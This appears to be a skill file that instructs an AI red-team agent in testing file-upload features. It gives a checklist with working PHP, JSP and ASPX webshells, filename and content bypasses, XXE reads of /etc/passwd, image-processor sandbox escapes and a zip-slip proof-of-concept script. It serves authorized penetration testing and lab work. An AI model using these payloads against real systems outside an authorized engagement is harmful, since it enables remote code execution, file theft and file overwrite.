---
name: file-upload-testing
description: File upload vulnerability testing — webshells, bypass, path traversal
origin: RedteamOpencode
---

# File Upload Vulnerability Testing

## When to Activate

- Application allows file upload (profile picture, document, attachment)
- File processing features (image resize, PDF conversion, import)
- Any endpoint accepting multipart/form-data

## Tools

- `run_tool curl` (multipart upload)
- Burp Suite Repeater (modify upload requests)
- ExifTool (embed payloads in metadata)
- Custom polyglot file generators

## Methodology

### 1. Understand Upload Mechanism

- [ ] Identify upload endpoint and parameters
- [ ] Check allowed file types (client-side vs server-side validation)
- [ ] Determine where files are stored (same domain, CDN, S3)
- [ ] Check if uploaded files are directly accessible via URL
- [ ] Check if filename is preserved or randomized
- [ ] Map the concrete workflow around the file: `submit → persist → retrieve/render/admin-review`
- [ ] Reuse existing upload evidence before branching into more payload variants

### Follow-Up Discipline (critical for unattended runs)

- Treat a successful upload acceptance or an existing upload finding as the start of a workflow, not the end.
- On follow-up passes, do **not** keep free-exploring extension/MIME permutations if the unresolved question is really where the uploaded content lands.
- Spend one bounded step on the highest-signal consumer path already evidenced by the app: retrieval URL, public/static asset path, gallery/list view, moderation queue, document viewer, export/download path, or downstream parser.
- If direct retrieval falls back to a generic SPA/root page, that is **not** a terminal negative result. Pivot once to the workflow consumer that already references the upload (for example the complaint/review/admin moderation list, document preview, attachment detail, or parser/import job) and record whether the uploaded filename/content is rendered, linked, parsed, or rejected there.
- For local lab / CTF recall targets, explicitly try the canonical challenge-triggering consumer action when the app has already exposed it: upload the accepted payload, bind it to the matching workflow record if required, then open the consuming route/list/detail with the authenticated session or browser-flow primitive already in evidence. This is the step that converts an upload finding into solved-state evidence for challenges such as upload-type, stored-file render, or malicious attachment workflows.
- Lab objective recall branch: when the active profile (`lab-profile.json`) lists an upload
  objective, after `/file-upload` or any multipart endpoint accepts a payload, run one bounded
  confirmation before closing the upload case: submit a non-PDF/non-ZIP payload such as a tiny
  `.txt`, `.xml`, or `.svg` with the same authenticated context, preserve the status/body
  evidence, then visit the consumer or objective source that confirms whether the upload
  objective flipped. Consult the profile's `recall_branches` for the exact route. If the upload
  accepts but the consumer route is still unknown, return `REQUEUE` with the exact uploaded
  filename and the next concrete consumer path to inspect instead of `DONE STAGE=exhausted`.
- If the consumer path still is not provable inside that bounded pass, return `DONE STAGE=vuln_confirmed` or `REQUEUE` with a concrete next step (exact workflow/artifact to confirm) instead of marking the case clean/exploited or leaving the batch without outcomes.
- Keep the guidance generic: focus on storage, retrieval, rendering, parsing, and authorization around uploaded content — not target-specific paths.

### 2. Extension Bypass

- [ ] Double extension: `shell.php.jpg`, `shell.php.png`
- [ ] Null byte (legacy): `shell.php%00.jpg`, `shell.php\x00.jpg`
- [ ] Case variation: `shell.PhP`, `shell.pHP`, `shell.Php`
- [ ] Alternative extensions: `.php3`, `.php5`, `.phtml`, `.phar`
- [ ] JSP alternatives: `.jspx`, `.jsw`, `.jsv`
- [ ] ASP alternatives: `.aspx`, `.ascx`, `.ashx`, `.asa`, `.cer`
- [ ] Trailing characters: `shell.php.`, `shell.php...`, `shell.php `, `shell.php::$DATA`
- [ ] Upload `.htaccess` to add custom handler: `AddType application/x-httpd-php .xyz`
- [ ] Upload `.user.ini` with `auto_prepend_file=shell.jpg`

### 3. Content-Type Bypass

- [ ] Change `Content-Type` to `image/jpeg` or `image/png` while sending PHP
- [ ] Remove Content-Type header entirely
- [ ] Use valid MIME type for allowed format

### 4. Magic Bytes / Content Bypass

- [ ] Prepend valid image header: `GIF89a;<?php system($_GET['c']); ?>`
- [ ] Add JPEG magic bytes `FF D8 FF E0` before payload
- [ ] PNG header + PHP code in IDAT chunk
- [ ] Embed PHP in EXIF data: `exiftool -Comment='<?php system("id"); ?>' image.jpg`
- [ ] Polyglot file: valid image that is also valid PHP
- [ ] GIF/JAR polyglot: valid GIF trailer (`0x3B`) immediately followed by a ZIP local-file-header (`PK\x03\x04`) — the file renders as an image while `java -jar` or a ZIP tool reads it as an archive (classic GIFAR technique, still effective against upload validators that only check the leading bytes)
- [ ] PDF/ZIP polyglot: valid `%PDF-1.` header with a ZIP central-directory record appended after `%%EOF` — passes PDF-magic checks while unzip tools still locate and extract the trailing archive
- [ ] PHP/JPEG polyglot via JPEG comment segment (`FFFE`) instead of EXIF — some validators strip EXIF but not comment segments, and some PHP configurations execute code placed there when the file is `include()`'d rather than served directly
- [ ] Truncated/malformed magic bytes: send only the first 4-8 bytes of a valid header before the payload — some content-sniffing validators read a fixed prefix length and stop, never validating the rest of the structure
- [ ] Content-Type vs magic-byte mismatch matrix: test all four combinations (correct extension/correct bytes, correct extension/wrong bytes, wrong extension/correct bytes, wrong extension/wrong bytes) against the same endpoint to map which signal the validator actually trusts

### 5. Webshell Payloads

- [ ] PHP: `<?php system($_GET['c']); ?>`
- [ ] PHP short tag: `<?=`cat /etc/passwd`?>`
- [ ] JSP: `<% Runtime.getRuntime().exec(request.getParameter("c")); %>`
- [ ] ASPX: `<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd","/c " + Request["c"]); %>`
- [ ] Minimal: `<?=phpinfo();?>` to confirm execution

### 6. Path Traversal in Filename

- [ ] `../../../var/www/html/shell.php`
- [ ] `..%2f..%2f..%2fshell.php`
- [ ] `....//....//shell.php`
- [ ] Overwrite existing files: `../../config.php`
- [ ] Target web root or cron directories

### 7. Special File Attacks

- [ ] SVG with XSS: `<svg onload="alert(1)">` or `<script>` in SVG
- [ ] SVG with XXE: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
- [ ] HTML file upload → stored XSS
- [ ] PDF with JavaScript
- [ ] ZIP slip: archive with `../../` path entries
- [ ] XML file with XXE (DOCX, XLSX inner XML)

### 8. Size and Resource Limits

- [ ] Upload extremely large file — check size limits
- [ ] Upload many files rapidly — check rate limits
- [ ] Zip bomb / decompression bomb
- [ ] Image with huge dimensions (pixel flood)

### 9. Server-Side Processing Abuse

- [ ] ImageMagick: test ImageTragick-style vectors — MVG/SVG files with `push graphic-context`/`image over` reading local files or shelling out (`\|ls "-la"`) if a vulnerable delegate is in use
- [ ] Ghostscript: PostScript/EPS payload testing `-dSAFER` sandbox bypass (`{ null exec } ... .forceput` chains) when PDF/EPS is rasterized server-side
- [ ] FFmpeg: HLS/M3U8 playlist upload referencing local `file://` or `concat:` inputs to read arbitrary files during transcode
- [ ] Office conversion (LibreOffice/unoconv): DOCX/ODT macro or `<< >>` field-code injection that triggers SSRF or command execution during headless conversion
- [ ] PDF generation: check whether user-supplied HTML/CSS-to-PDF renderers (wkhtmltopdf, headless Chrome print) fetch remote resources — chain into `ssrf-testing` via `<img src="http://internal-host/">` or `<link>`/`@import`
- [ ] Thumbnail/EXIF pipelines: confirm whether metadata extraction itself parses untrusted binary structures (libexif, ExifTool CVE-class parsers) rather than just displaying the values

### 10. Cloud / Object-Storage Upload Abuse

- [ ] If uploads go through a pre-signed PUT URL, check whether the signature is scoped to one exact key/path or can be reused for an arbitrary key (path traversal in the object key)
- [ ] Check pre-signed URL expiry — an excessively long-lived URL is a data-exposure finding on its own
- [ ] Azure SAS token: check scope (`sp=` permissions) for `w`/`d` beyond what the upload feature needs, and container-level vs blob-level scope
- [ ] Confirm the storage bucket/container itself is not publicly listable once the object lands there (chain into `cloud-testing`)

### 11. Race Conditions in Upload Processing

- [ ] TOCTOU: request the uploaded file's direct URL in a tight loop immediately after submission, before an async antivirus/content scan completes — confirm whether the file is servable/executable during that window
- [ ] Parallel upload of the same filename to test overwrite-vs-rename handling and whether a partially written file is briefly servable

### 12. Archive Extraction and Zip-Slip Deep Dive

- [ ] Classic zip-slip: entry name `../../../../etc/cron.d/persist` inside an otherwise valid ZIP/TAR/JAR to write outside the intended extraction directory
- [ ] Absolute-path entry: an entry name starting with `/` (`/etc/passwd`) — some extractors treat a leading slash as relative to the extraction root, others honor it as absolute and overwrite the real file
- [ ] Windows-style traversal inside a cross-platform extractor: `..\\..\\windows\\win.ini` or backslash-mixed separators, which some Linux-built extraction libraries fail to normalize before writing
- [ ] Symlink-based extraction escape: a TAR entry that first creates a symlink (`link -> /var/www/html`) and a second entry that writes through that symlink path — bypasses a path-traversal filter that only checks each entry name literally, not the resolved target
- [ ] Nested-archive traversal: a ZIP containing another ZIP/TAR whose *inner* entry names carry the traversal payload, for a pipeline that recursively extracts nested archives without re-validating each layer
- [ ] Decompression-ratio/zip-bomb interaction: combine a zip-slip entry name with a highly compressed payload so a single malicious entry both escapes the directory and exhausts disk/inode budget on write — record this as two separate findings (path traversal, resource exhaustion) even when delivered in one archive
- [ ] Duplicate-entry overwrite: two entries with the same resolved path in one archive, where the extractor processes them in order — can overwrite a validation-checked file with a second, unchecked payload after the scanner has already approved entry #1

```bash
python3 -c "
import zipfile
with zipfile.ZipFile('slip.zip', 'w') as z:
    z.writestr('../../../../tmp/zipslip_poc.txt', 'zip-slip poc')
"
```

Confirm only by observing the resulting file path server-side (via a subsequent authorized read, not a destructive write target); never target a path outside the engagement's writable scratch area.

## What to Record

- Upload endpoint and filename parameter
- Bypass technique used (extension, content-type, magic bytes)
- Uploaded file URL and whether it executes
- Webshell payload and confirmed RCE
- Path traversal success and file overwritten
- Severity: Critical (RCE via webshell) or High (XSS, file overwrite)
- Remediation: allowlist extensions, validate content, rename files, store outside webroot
